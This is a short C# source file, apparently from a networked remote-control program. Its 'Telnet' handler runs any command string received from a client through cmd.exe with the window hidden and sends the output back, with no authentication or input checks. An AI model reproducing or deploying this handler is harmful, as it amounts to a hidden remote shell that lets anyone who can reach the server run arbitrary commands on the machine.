using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Permissions;

namespace Echo.Net.Server
{
    using System.IO;
    using System.Threading;

    public static class Telnet
    {
        public static void Process(ClientPacket.Telnet telnet)
        {
            string command = telnet.Request;
            Thread thread = new Thread(new ParameterizedThreadStart(Work));
            thread.Start(command);
        }

        [EnvironmentPermissionAttribute(SecurityAction.LinkDemand, Unrestricted = true)]
        public static void Work(object obj)
        {
            string command = (string)obj;
            using (System.Diagnostics.Process process = new System.Diagnostics.Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardInput = false;

                //开始进程  
                if (process.Start())
                {
                    //这里无限等待进程结束
                    process.WaitForExit();
                    //读取进程的输出
                    string output = process.StandardOutput.ReadToEnd();

                    ServerPacket serverPacket = new ServerPacket(PacketType.Telnet);
                    serverPacket.telnet = new ServerPacket.Telnet(output);
                    Server.packetStream.Send(serverPacket);
                }

            }
        }
    }
}
